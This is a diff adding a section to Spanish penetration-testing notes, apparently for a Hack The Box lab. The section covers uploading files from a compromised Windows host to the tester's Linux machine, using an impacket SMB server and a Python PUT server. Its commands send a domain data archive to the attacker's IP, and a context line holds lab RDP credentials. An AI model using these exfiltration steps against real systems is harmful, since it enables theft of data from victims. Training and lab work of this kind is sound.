@@ -403,3 +403,72 @@ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/h
 Para acceder al directorio desde el Windows remoto, podemos conectarnos a `\\tsclient\`.
 
 ![[Pasted image 20250409125008.png | 600]]
+
+### Subiendo un archivo desde Windows 
+
+Vamos a revisar formas de subir un archivo desde un Windows remoto a nuestro host Linux.
+
+##### Mediante un servidor SMB
+
+1. Montar el recurso compartido desde nuestro host
+
+```bash
+mkdir /tmp/share
+cd /tmp/share
+impacket-smbserver sharename /tmp/share -smb2support
+```
+
+- `sharename`: el nombre del recurso (ponle algo sencillo).
+- `-smb2support`: importante para compatibilidad con Windows modernos.
+
+2. Subir el archivo desde Windows
+
+```powershell
+copy C:\path\to\file.zip \\10.10.XX.XX\sharename\
+```
+
+Si falla por autenticación, forzamos a Windows a que el recurso:
+
+```powershell
+net use \\10.10.14.XX\sharename /user:test test
+```
+
+Si nos sale un error como este, tendremos que buscar otra forma de realizar la subida.
+
+![[windows_error_smb.png]]
+
+##### Montar un servidor web desde nuestro host que reciba archivos vía PUT
+
+1. Montar el servidor desde nuestro host kali
+
+```python
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import os
+
+class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
+    def do_PUT(self):
+        path = self.translate_path(self.path)
+        length = int(self.headers['Content-Length'])
+        content = self.rfile.read(length)
+        with open(os.path.basename(path), 'wb') as f:
+            f.write(content)
+        self.send_response(200)
+        self.end_headers()
+
+    def translate_path(self, path):
+        return path.strip("/")
+
+httpd = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
+print("Listening on port 8080 for PUT requests...")
+httpd.serve_forever()
+
+```
+
+Ejecutamos el script y lo dejamos en segundo plano
+
+2. Subir el archivo desde el Windows remoto
+
+```powershell
+Invoke-RestMethod -Uri http://10.10.14.82:8080/INLANEFREIGHT.zip -Method PUT -InFile "C:\Tools\20250702221541_INLANEFREIGHT.zip"
+```
+
